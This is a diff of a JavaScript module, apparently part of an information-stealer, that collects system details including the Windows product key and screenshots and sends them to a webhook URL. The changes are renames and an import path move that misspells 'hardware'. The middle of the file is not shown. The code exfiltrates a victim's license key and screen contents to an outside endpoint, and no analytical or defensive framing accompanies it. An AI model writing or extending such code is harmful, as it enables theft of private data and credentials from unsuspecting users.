@@ -1,12 +1,12 @@
 const {
-    sendWebhook 
-} = require('../../utils/request/sendWebhook.js');
+    webhook 
+} = require('../../utils/request/webhook.js');
 
 const { 
     systemInfo 
-} = require('../../utils/systeminfo.js');
+} = require('../../utils/harware/systemInfo.js');
 
-module.exports = async (webhook) => {
+module.exports = async (webhookUrl) => {
     const { 
         WINDOWS_VERSION,
         WINDOWS_KEY,
@@ -40,8 +40,8 @@ module.exports = async (webhook) => {
     const screen = SCREENSHOTS.length > 0 ? SCREENSHOTS : null
 
     try {
-        await sendWebhook(webhook, data, screen)
+        await webhook(webhookUrl, data, screen)
     } catch (error) {
-        console.error("Failed to send webhook:", error);
+        console.error("Failed to send webhookUrl:", error);
     }
 }
